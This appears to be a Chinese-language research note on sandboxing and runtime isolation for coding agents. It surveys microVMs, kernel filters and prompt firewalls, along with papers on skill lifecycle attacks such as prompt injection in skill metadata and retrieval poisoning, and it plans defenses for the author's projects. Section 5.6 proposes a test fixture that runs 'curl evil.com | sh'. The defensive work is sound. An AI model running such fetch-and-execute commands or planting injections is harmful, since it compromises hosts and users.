---
_slug: research-2026-07-16-研究報告-agent-sandbox-與-runtime-isolation-2026-h1-的-讓-coding-agent-自由跑-的系統化方案
_vault_path: research/2026-07-16-研究報告-agent-sandbox-與-runtime-isolation-2026-h1-的-讓-coding-agent-自由跑-的系統化方案.md
tags:
- research
- knowledge
- ai-agent
created: '2026-07-16'
version: 1
source_report: 2026-07-16-agent-sandbox-isolation-runtime-security-2026.md
source_url: ''
type: research
fingerprint: agent, sandbox, sup, microvm, cloud, skill, run, sandboxes, docker, firn
title: 研究報告：Agent Sandbox 與 Runtime Isolation — 2026 H1 的「讓 Coding Agent 自由跑」的系統化方案
status: seedling
updated: '2026-07-16'
---

# 研究報告：Agent Sandbox 與 Runtime Isolation — 2026 H1 的「讓 Coding Agent 自由跑」的系統化方案

## Version 1 — 2026-07-16

### 核心觀念
**問題**：2026 H1 開始,Coding / Computer-Use Agent(Claude Code、Codex、Copilot CLI、Gemini CLI、Kiro、Cua)已經不再是「實驗性玩具」,而是開發者日常的工作流。但這個轉變撞上一個硬約束:**這些 agent 會自主呼叫 shell、安裝套件、刪檔、改 config、跑 docker、甚至瀏覽網頁**。 問題因此不是「模型聰不聰明」,而是: > 我們能不能讓 agent **完全自主、不中斷、不煩使用者確認**地跑,同時保證 **host 不會被搞壞、祕密不會外洩、不會被 prompt injection 操控去做惡意行為**?…

**洞見**：2026 H1 這個 sandbox stack 成熟的真正意義:**讓 coding agent 從 supervised tool 升級成 unsupervised infra**。 具體觀察: 1. **Docker 把它做成產品**:不是 hobbyist 玩具,而是 enterprise 級「Docker Sandboxes」服務,代表 market pull 已成型。 2. **Google Cloud 把它做成 cloud primitive**:Cloud Run Sandboxes 讓 agent code execution 跟 Cloud Functions 一樣 com…

### 架構 / 機制
## 2. Core Mechanism

### 2.1 三層 Sandbox Stack

2026 H1 出現的 agent sandbox 系統,雖然各家取捨不同,但都收斂到同一個三層結構:

```
┌──────────────────────────────────────────────────────────────┐
│  Layer 3: Prompt / Tool Firewall (clawshield, Doberman, Lasso) │
│    - 訊息層 prompt injection / secret / PII 掃描                │
│    - 工具呼叫 allow-list / capability token                      │
├──────────────────────────────────────────────────────────────┤
│  Layer 2: MicroVM / Container Runtime                          │
│    - Firecracker (arrakis, Docker Sandboxes)                   │
│    - gVisor / Cloud Hypervisor                                 │
│    - LXC / K8s (Containarium)                                  │
│    - Cloud Run Sandbox (Google 2026-07)                        │
├──────────────────────────────────────────────────────────────┤
│  Layer 1: Kernel-Level Syscall / FS / Network Filter           │
│    - seccomp-bpf + Landlock (Greywall, Fence)                  │
│    - eBPF egress policy (Containarium, clawshield)             │
│    - macOS Seatbelt + pf firewall (Hazmat, ClodPod)            │
└──────────────────────────────────────────────────────────────┘
```

**對 firn 而言最重要的訊息**:這三層不是互相競爭的方案,而是**互補**。kernel filter(L1)擋低階 syscall 攻擊、microVM(L2)擋跨 session 持久化與資源外洩、prompt firewall(L3)擋 social engineering 與 instruction override。

### 2.2 SkillSec-Eval:Lifecycle-Aware Threat Model (2607.13987)

Badhe & Tiwari (2026-07-15) [<sup>2</sup>](#2) 提出對 agent skill 安全最關鍵的觀察:**目前主流 sandbox 研究幾乎只看「runtime execution」一個階段,但 skill 在進入 runtime 前已經歷 5 個 lifecycle stage,每個都有不同攻擊面**:

```
┌────────────────┐  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐
│  Repository    │  │  Semantic      │  │  Planner       │  │  Execution     │  │  Skill         │
│  Admission     │→ │  Retrieval     │→ │  Selection     │→ │                │→ │  Evolution     │
│                │  │                │  │                │  │                │  │                │
│  malicious     │  │  poisoning     │  │  mis-routing   │  │  code execution│  │  version       │
│  skill upload  │  │  embedding     │  │  attack        │  │  exfiltration  │  │  downgrade /   │
│  to registry   │  │  injection     │  │  (pick unsafe  │  │  data leak     │  │  supply-chain  │
│                │  │                │  │  skill first)  │  │  privilege esc │  │  hijack        │
└────────────────┘  └────────────────┘  └────────────────┘  └────────────────┘  └────────────────┘
```

他們用 327 個 real-world skills 做 empirical evaluation,發現**漏洞出現在 lifecycle 的每個階段,不只在 execution**。這直接 hit 我們的系統:hermes 的 skills 是 progressive-disclosure,但現在沒有一個 stage 各自獨立的驗證。如果有人在 skill 的 YAML frontmatter 塞 prompt injection,他可能在 `semantic retrieval` 階段就已經開始影響後續決策,根本不會等到 execution 被 sandbox 攔下來。

### 2.3 Rethinking Penetration Testing for AI (2607.14006)

Allahbakhsh 等人 (2026-07-15) [<sup>3</sup>](#3) 提出 AI-enabled pentesting 的重新定義:傳統 pentesting 評估「能不能 compromise 資源」,但 AI-enabled 系統的攻擊面**根本不是資源 compromise**——攻擊者改的是:

- 對 prompt 的影響
- 對 retrieved content 的 poisoning
- 對 sensor input 的 manipulation
- 對 memory 的污染
- 對 tool 的 misuse
- 對 human-AI interaction loop 的操控

他們命名為 **Behavioral Objective Violation** — 攻擊目標是讓「AI 治理的行為」違反 operational objective,而不是拿到 root access。並提出 6 步 workflow:

```
1. Identify operational objectives
2. Map AI-governed behavior
3. Analyze adversarial influence surfaces
4. Define behavioral failure criteria
5. Execute scenario-based tests
6. Report evidence linking adversarial action to objective violation
```

這跟 firn 7-01 的 meta-agent supervision、6-13 的 prompt-injection firewall 是同一個 domain 但不同切角:它把「滲透測試」這個既有的資安方法論重新對應到 AI 行為。

### 2.4 Docker Sandboxes microVM 設計模式 (2026-01-30)

Docker 2026-01 的部落格 [<sup>1</sup>](#1) 把 microVM-based agent sandbox 的設計 pattern 攤開來,值得仔細看:

> "Each agent runs in an isolated version of your development environment, so when it installs packages, modifies configurations, deletes files, or runs Docker containers, your host machine remains untouched."

關鍵設計決策:

- **Image reuse + delta**:不是每個 session 都從頭 build,而是 base image + per-session overlay,讓 spawn time < 1s
- **API surface**:`docker sandbox run claude-code "..."` — 用 docker CLI 既有的 mental model,降低 developer adoption cost
- **Filesystem binding**:agent 看到的 `/workspace` 是 host 上特定目錄的 bind-mount,所以 session 結束後 code 還在,但 agent 在 session 內做的 system-level mutation 全部被 microVM 邊界擋住
- **Network egress policy**:預設 deny,需要時 per-domain whitelist

### 2.5 Cloud Run Sandboxes:Public Preview (2026-07-10)

Google Cloud 2026-07-10 [<sup>4</sup>](#4) 推出 Cloud Run Sandboxes in public preview,技術重點:

- 跟 Cloud Run **同一個 service instance** 內 spawn,latency ~500ms
- "Lightweight, isolated execution boundaries"
- 從雲端開發者角度看,microVM-as-a-service 把「自架 sandbox 基礎設施」變成 commodity

```python
# Pseudo-API based on Cloud Run Sandboxes doc
from google.cloud import run_sandbox
sandbox = run_sandbox.create(language="python", timeout=30)
result = sandbox.execute(untrusted_code, env={})
sandbox.destroy()
```

這跟 E2B、Modal、Daytona 走同一條路:**agent code execution 變成 serverless primitive**。

### 2.6 Open Source Reference Architectures(5 個值得看的實作)

| 專案 | Stars | Layer 1 (Kernel) | Layer 2 (Runtime) | Layer 3 (Firewall) | 設計特點 |
|------|-------|-----------------|------------------|-------------------|---------|
| **abshkbh/arrakis** [<sup>5</sup>](#5) | 838 | — | Firecracker microVM | — | Self-hostable, Python SDK + REST API, automatic port forwarding, **backtracking replay** |
| **GreyhavenHQ/greywall** [<sup>6</sup>](#6) | 266 | Landlock + seccomp + greyproxy | Container-free | Network filter | **Deny-by-default**, kernel-enforced FS / network / syscall isolation, Linux + macOS |
| **FootprintAI/Containarium** [<sup>7</sup>](#7) | 260 | eBPF egress | SSH-native | — | K8s + LXC backends, GPU passthrough, **MCP-native CLI**, multi-tenant |
| **dredozubov/hazmat** [<sup>8</sup>](#8) | 124 | macOS Seatbelt + pf firewall | Backup/rollback | User isolation | **TLA+ verified**, formal methods on containment |
| **llm-platform-security/SecGPT** [<sup>9</sup>](#9) | 118 | — | — | Plugin-based | **Capability-based**, multi-agent framework integration |

加上下列兩個**補充**的 tool-call 防火牆:

| 專案 | Stars | 定位 |
|------|-------|------|
| **SleuthCo/clawshield-public** [<sup>10</sup>](#10) | 131 | Go reverse proxy + iptables + eBPF kernel monitor,YAML policy engine,audit logging |
| **fu351/Doberman-Core** [<sup>11</sup>](#11) | 112 | AI agent security framework:guardrails、prompt injection defense、tool-use permissions、audit logs |

### 2.7 Supply-Chain Attack 對 Agent 的影響 (2607.13965)

Huang 等人 (2026-07-15) [<sup>12</sup>](#12) 提出的 **ProfMalPlus** 在我們這篇雖然是配角,但呼應一個事實:當 agent 自己執行 `npm install`,它被 supply-chain 攻擊的暴露面跟人類開發者**一模一樣**。他們的關鍵洞察:

- 靜態分析對 obfuscated JS 不夠
- LLM 直接讀程式碼會丟失 object-centric semantic
- 解法:**agent-coordinated static+dynamic analysis** —— local judge agent 看 code slice,global judge 整合,**undetermined case 進 sandbox 跑**

```text
package entry → static graph → LLM slice → local judge agents
                                          ↓
                              undetermined?
                                ├─ no → final verdict
                                └─ yes → sandbox dynamic exec → re-judge
```

這個 sandbox-as-2nd-opinion 的用法,跟 7-04 tool synthesis 報的「compile-and-execute as verification」一脈相承。

### 思考
## 4. Limitations / Honest Assessment

### 4.1 來源中的自我揭露限制

**SkillSec-Eval (2607.13987)**:作者承認實驗只用 327 個 skills,且來自單一 ecosystem(沒說是 Claude Skills / Hermes Skills 還是 MCP)。threat taxonomy 涵蓋 lifecycle 5 個 stage,但**沒有量化每個 stage 的攻擊成功率分布**,只說 "vulnerabilities arise at multiple stages"。這對 tooling priority 不夠具體。

**Rethinking Pentest (2607.14006)**:整篇是 conceptual framework,沒有 empirical benchmark。running example 是 SOC assistant,套到其他 domain(general coding agent、web agent、autonomous trading)需要重新驗證。

**ProfMalPlus (2607.13965)**:只在 NPM 上驗證,沒測 PyPI / crates.io / go modules,而 2026 H1 agent 已經會自主裝各種 ecosystem 的 package。

**Docker Sandboxes blog**:vendor 視角,沒有量化「spawn latency vs security isolation tradeoff」的具體數字,只有 marketing 等級的描述。

### 4.2 我們的獨立評估

**(a) Sandbox ≠ Defense in Depth 的單一解決方案**

arrakis、Greywall、Containarium 都用 microVM / kernel filter 解決「agent 不能搞壞 host」,但對 prompt injection 透過 tool argument 注入、retrieved doc poisoning、memory pollution**完全無能為力**。clawshield、Doberman、SkillSec-Eval 在 L3 才介入,但 L3 又沒辦法擋 L2 已經執行的 syscall。這三層必須**同時存在**,目前市場上沒有一個 repo 整合得很好——firn 如果只挑一個就會有 gap。

**(b) MicroVM 的 cold-start 開銷**

Firecracker ~125ms boot、Cloud Run Sandboxes ~500ms——對**單步 tool call**來說,可以接受。但對**多步 long horizon agent**(例如 hermes-firn QA engineer 跑一個 test session 100+ tool calls),每次 spawn 都會累積成本。Docker Sandboxes 的解法是 image reuse + overlay,但**per-session disk / memory 仍有 baseline overhead**。

**(c) Capability-based security 在 LLM agent 上很難做對**

LLM agent 的「能力」是 fuzzy 的(它「能寫 code」是它的能力,不是它的 capability token),傳統 capability-based security(像 Capsicum、seL4)需要 kernel 級 enforcement。Hazmat 用 Seatbelt 是 macOS-only。Linux 這邊 Landlock + seccomp 是 userland process filter,**對 root 進程無效**——而很多 coding agent 為了 network / port forwarding 需要 root。

**(d) 「讓 agent 自由跑」會被 EU AI Act 等監管挑戰**

Coding agent 在 microVM 內跑 ≠ 對人類沒風險。Agent 寫出來的 code 還是會 deploy 到 production,deploy 階段的 audit / human oversight 是另一條戰線。Sandbox 解決「agent 不能直接砸 host」,但不解決「agent 不能做出有 bias / 有害的部署決策」。SkillSec-Eval 提的 lifecycle threat model 其實還沒覆蓋到「deployed artifact」這個下游階段。

**(e) 開源實作 maturity 不均**

- **arrakis**(838⭐)、**Greywall**(266⭐) 有 active dev、文件清楚
- **Hazmat**(124⭐) 標榜 TLA+ verified,但實作只有 macOS
- **SecGPT**(118⭐) 是 plugin framework,**沒有自己的 microVM**,基本上是 policy layer
- 大部分 repo 仍在 0.x 版,**breaking change 風險高**

**(f) Reproducibility**

- Docker Sandboxes、Cloud Run Sandboxes:**closed-source / vendor-controlled**,個人開發者無法本地重現
- Arrakis、Greywall、Hazmat:**self-hostable**,但 microVM 在一般 Linux dev box 需要 KVM,Windows / WSL2 用戶會卡
- Cloud Run Sandboxes 強調 "1,000 sandboxes in <1s",但這是 cloud scale;**本地無法達到**

**來源類型**：unknown

### 應用
## 5. Actionable for Our Projects

### firn(hierarchical agent QA system)

按 7-15 governance 的精神,所有 firn 動作都要附「實作難度」+「是否需付費」。

#### 5.1 把「skill lifecycle security」內建到 hermes-agent skill 系統 — **MODERATE**

- **動機**:SkillSec-Eval (2607.13987) 指出 skills 在 repository admission → semantic retrieval → planner selection → execution → evolution 各階段都有攻擊面。Hermes 的 skills 是 progressive-disclosure(progressive-disclosure 見 6-08),目前只有 YAML frontmatter 解析,**沒有 lifecycle 驗證**。
- **行動**:
  1. 為每個 skill 加一個 `security_manifest.json`:`{admission_signature, retrieval_keywords_clean, planner_constraints, execution_permissions, evolution_pinned_versions}` — **TRIVIAL**
  2. 在 `skill_view()` 載入時比對 manifest,任何欄位缺失 → warn — **TRIVIAL**
  3. 為 critical skills(影響 vault 寫入、git push、cron 排程)強制 admission signature(GPG / Sigstore) — **MODERATE**
- **免費方案**:GPG / openssl 都有,不需要付費。
- **預期效益**:把 skill 攻擊面從 lifecycle 5 階段縮到 1 階段(admission),其他階段變 defense-in-depth。

#### 5.2 firn test session 包進 microVM — **MODERATE → HARD(視部署)**

- **動機**:Firn QA engineer 跑 test suite 時會 `git clone`、`npm install`、跑 build,目前直接在 host 跑,意外 side effect 風險高。
- **行動**:
  - **優先選 arrakis**(838⭐, Python SDK + REST,Firecracker microVM)<sup>5</sup> — 跟 firn 的 Python stack 整合成本最低
  - 把 `firn test run` 包成 `arrakis sandbox.create() → session.run() → sandbox.destroy()` —— 每個 test session 一個 microVM
  - **保留 host filesystem bind mount** 讓 test artifacts 仍可被收集
- **成本**:arrakis 免費,但**底層需要 KVM**,Linux dev box OK,Windows / WSL2 用戶需另尋方案。
- **替代**:Greywall(266⭐)<sup>6</sup> 用 Landlock + seccomp,**不需要 KVM**,但隔離強度比 microVM 弱一階。
- **免費方案**:兩個都免費,只需 Linux host with KVM / Landlock support。

#### 5.3 加 Layer 3 prompt firewall 到 hermes-agent gateway — **MODERATE**

- **動機**:6-13 已建 prompt-injection firewall 在 LLM-layer;但 SkillSec-Eval 提醒,attack 也在 skill retrieval 階段發生。
- **行動**:
  - 在 hermes-agent 的 tool-call 出口加一個 reverse proxy(check `clawshield-public` 設計<sup>10</sup>):掃描 outbound request 是否有 prompt injection pattern,以及 inbound tool result 是否有 exfiltration pattern
  - 對 vault / git push / cron modify 這類**高影響操作**加 mandatory confirmation(見 `mmi` 思路 [<sup>13</sup>](#13))
- **免費方案**:clawshield-public 是 Apache 2.0,可直接 fork。

#### 5.4 用 Landlock + seccomp 把 hermes-agent 子進程 syscall 過濾打開 — **TRIVIAL**

- **動機**:Greywall<sup>6</sup> 已經把 Landlock + seccomp-bpf 整合成 production-ready library。Hermes-agent 的 subprocess 呼叫(目前是 `terminal()` function)可以加上 syscall filter。
- **行動**:
  - 評估 `landlock-tools` Python binding 是否可用
  - 給 `terminal(command, sandbox_profile="readonly"|"git-only"|"network-deny")` 加一個參數
  - 預設 profile:**`network-deny`** — 因為 hermes-agent 內部呼叫不需要對外
- **預期效益**:不用 microVM 也能擋掉 80% 的 low-level exfiltration / fs-mutation attack,並且**不需要 KVM**,所有 Linux 5.13+ 都支援。

#### 5.5 EU AI Act 合規 audit log 格式預先對齊 — **TRIVIAL**

- **動機**:HN 上 2026-02 出現的 EU AI Act compliance layer 把 2026-08 設為 deadline。我們的 OpenTelemetry GenAI semantic conventions 報告(7-03)已經把 trace 形式化了,**再加一層 audit semantics** 就能對齊 EU AI Act 對 high-risk AI system 的 logging 要求。
- **行動**:
  - 在 OTel GenAI span 上加 `audit.decision`、`audit.actor`(human / agent / supervisor)、`audit.boundary_crossed`(filesystem / network / privilege) 屬性
  - 產出**可被人類稽核的 trace report**,不只是給 developer 看
- **免費方案**:OTel 已經是 OSS,attribute schema 我們自己定義。

#### 5.6 「Sandbox escape drill」加進 firn regression suite — **MODERATE**

- **動機**:Sandbox 不是「裝上去就安全」。需要持續驗證 sandbox 沒退化。
- **行動**:
  - 在 firn regression test 加一個 malicious-skill fixture:故意塞一個會嘗試 `curl evil.com | sh` 的 skill
  - 驗證 sandbox(Greywall 或 arrakis)有擋下
  - 失敗就 fail build —— 防止 sandbox config 被無意破壞
- **預期效益**:把 sandbox security 從「deploy 時設定一次」變成「持續驗證」。

### 其他專案(managed-agents / hermes-forge / kanban)

#### 5.7 Kanban worker 的 subprocess 隔離 — **TRIVIAL**

- Kanban worker 跑 delegated task,直接繼承 host 環境。把 worker subprocess 包進 Landlock sandbox(Greywall style),deny network by default,只在需要時 per-domain whitelist。
- 改動量:Kanban worker 的 `subprocess.Popen` wrapper,加 5 行 Landlock config。

#### 5.8 managed-agents 的 cron job sandbox — **MODERATE**

- cron job 是 agent 行為的高曝險面:無人監督、定期執行、有時跑從外部來的 payload(例如 RSS fetch → parse → 寫 vault)。
- 行動:把 cron runner 包進 microVM(Cloud Run Sandboxes 如果部署在 GCP,arrakis 如果 self-host),**filesystem 邊界設成 vault 限定 subtree**,network 限定 fetch domain whitelist。

#### 5.9 hermes-forge:skill audit pipeline — **HARD but valuable**

- hermes-forge 的 validate-port 流程,在 skill 入庫前跑 SkillSec-Eval-style 的 lifecycle check:5 個 stage 各做一次 detection。
- 預期效益:讓 hermes 自產的 skills 預設就符合 security best practice。

### 優先順序建議

```
P0 (本週可做,免費)
- 5.4 syscall filter on hermes-agent subprocess   (TRIVIAL)
- 5.5 OTel audit semantics                       (TRIVIAL)
- 5.7 kanban worker sandbox                       (TRIVIAL)

P1 (2 週 sprint,免費但需整合)
- 5.1 skill lifecycle security manifest           (MODERATE)
- 5.3 hermes-agent gateway prompt firewall        (MODERATE)
- 5.6 sandbox escape drill in firn regression     (MODERATE)
- 5.8 cron job sandbox                            (MODERATE)

P2 (需 KVM / Linux host,免費但需 deployment)
- 5.2 firn test session in microVM                (MODERATE→HARD)
- 5.9 hermes-forge skill audit pipeline           (HARD)
```


### 來源

- 原始報告：2026-07-16-agent-sandbox-isolation-runtime-security-2026.md
- 類型：
- 連結：
